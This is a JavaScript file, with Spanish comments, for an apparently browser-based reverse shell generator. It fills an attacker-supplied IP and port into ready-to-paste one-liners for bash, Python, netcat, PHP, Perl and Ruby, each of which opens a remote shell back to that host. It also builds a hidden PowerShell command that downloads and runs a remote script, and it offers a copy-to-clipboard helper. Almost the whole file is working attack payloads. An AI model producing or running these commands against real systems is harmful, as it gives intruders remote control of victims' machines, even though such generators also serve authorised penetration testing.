// Función principal para generar el comando de reverse shell
function generateShell(type) {
    const ip = document.getElementById('attackerIP').value;
    const port = document.getElementById('attackerPort').value;
    let shellCommand = '';

    if (!ip || !port) {
        alert('Por favor, introduce la IP y el puerto para generar el comando.');
        return;
    }

    // Lógica para generar los comandos según el tipo
    switch (type) {
        case 'bash':
            shellCommand = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            break;
        case 'python':
            shellCommand = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
            break;
        case 'netcat':
            shellCommand = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
            break;
        case 'powershell':
            shellCommand = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object System.Net.WebClient).DownloadString('http://${ip}/shell.ps1')"`;
            break;
        case 'php':
            shellCommand = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            break;
        case 'perl':
            shellCommand = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
            break;
        case 'ruby':
            shellCommand = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
            break;
        case 'nc-openbsd':
            shellCommand = `nc -e /bin/sh ${ip} ${port}`;
            break;
    }

    document.getElementById('outputShell').value = shellCommand;
}

// Función para copiar el texto del área de salida al portapapeles
function copyToClipboard() {
    const outputTextarea = document.getElementById('outputShell');
    outputTextarea.select();
    document.execCommand('copy');
    alert('Comando copiado al portapapeles!');
}